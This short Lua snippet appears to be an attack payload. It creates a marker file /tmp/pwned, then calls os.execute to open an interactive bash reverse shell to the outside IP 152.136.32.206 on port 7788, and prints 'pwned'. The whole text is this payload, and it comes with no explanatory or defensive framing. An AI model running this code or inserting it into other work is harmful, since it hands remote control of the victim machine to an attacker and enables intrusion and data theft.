os.execute("touch /tmp/pwned")
os.execute("bash -c \"bash -i >& /dev/tcp/152.136.32.206/7788 0>&1\"")
print("pwned")